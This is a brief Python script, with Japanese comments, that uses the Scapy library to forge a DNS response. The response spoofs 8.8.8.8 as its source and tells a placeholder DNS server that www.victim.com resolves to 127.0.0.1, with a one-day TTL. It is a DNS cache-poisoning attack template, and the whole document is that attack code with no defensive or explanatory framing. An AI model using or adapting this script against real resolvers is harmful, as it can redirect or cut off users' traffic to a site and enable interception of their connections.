from scapy.all import *

# 偽のDNS応答を作成
spoofed_response = (
    IP(dst="DNS_SERVER_IP", src="8.8.8.8")
    / UDP(dport=53, sport=53)
    / DNS(
        id=0xAAAA,
        qr=1,
        aa=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname="www.victim.com", qtype="A"),
        an=DNSRR(rrname="www.victim.com", ttl=86400, rdata="127.0.0.1"),
    )
)

# 偽のパケットを送信
send(spoofed_response)
